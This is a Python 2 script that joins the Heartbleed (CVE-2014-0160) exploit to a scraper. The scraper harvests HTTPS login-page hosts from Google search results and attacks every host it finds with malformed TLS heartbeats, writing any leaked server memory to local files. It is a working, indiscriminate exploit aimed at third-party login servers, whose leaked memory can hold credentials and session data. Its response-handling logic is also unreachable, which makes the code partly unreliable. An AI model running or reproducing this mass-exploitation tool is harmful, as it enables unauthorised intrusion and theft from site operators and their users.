#coding: utf-8
import sys
import struct
import socket
import time
import select
import re
import urllib2
from urlparse import urlparse

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.') for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print


def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay


def hit_hb(s,eURL):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return False

    if typ == 24:
        print 'Received heartbeat response:'
        hexdump(pay)
        if len(pay) > 3:
            print 'WARNING: server returned more data than it should - server is vulnerable!'
            f=open(eURL,'w')
            f.write(pay)
            f.close()
        else:
            print 'Server processed malformed heartbeat, but did not return any extra data.'
        return True

    if typ == 21:
        print 'Received alert:'
        hexdump(pay)
        print 'Server returned error, likely not vulnerable'
        return False


def ssltest(eURL):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Connecting...to %s '%eURL
    sys.stdout.flush()
    s.connect((eURL,443))
    print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(hello)
    print 'Waiting for Server Hello...'
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    print 'Sending heartbeat request...'
    sys.stdout.flush()
    #s.send(hb)
    hit_hb(s, eURL)

proxy_support = urllib2.ProxyHandler({'https': 'http://127.0.0.1:8087'})  #代理服务器
opener = urllib2.build_opener(proxy_support, urllib2.HTTPSHandler)
urllib2.install_opener(opener)
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko'}

def main():
    print 'start spy, please wait ...'
    for x in range(0, 500):
        f =  open("link.txt", 'a')
        URL = "https://www.google.com.hk/search?q=inurl:https://+登录&start=%d" % x  #Google 搜索
        #URL="http://www.baidu.com/#wd=inurl:https://+登录&pn=%d"% x  #Baidu 搜索
        #URL="https://www.bing.com/search?q=inurl:https://+登录&first=%d" % x  #Bing 搜索
        #URL="http://www.sogou.com/web?query=inurl:https://&page=%d" % x  #Sogou 搜索
        req = urllib2.Request(url = URL, headers = headers)
        print URL
        try:
            x = urllib2.urlopen(req)
            content = x.read()
        except Exception, e:
            print 'Error:', e.message
            continue
        a = re.findall(r'(https://.*?/)', content)
        b = list(set(a))
        for i in b:
            o = urlparse(i)
            f.writelines(o.netloc+'\n')
        print "success spy %s page" % (x/10+1)
        delay = 5
        f.close()

        f = open("link.txt",'r')
        for line in f:
            line = line.strip()
            try:
                ssltest(line)
            except Exception, e:
                print 'Error:', e.message

if __name__ == '__main__':
    main()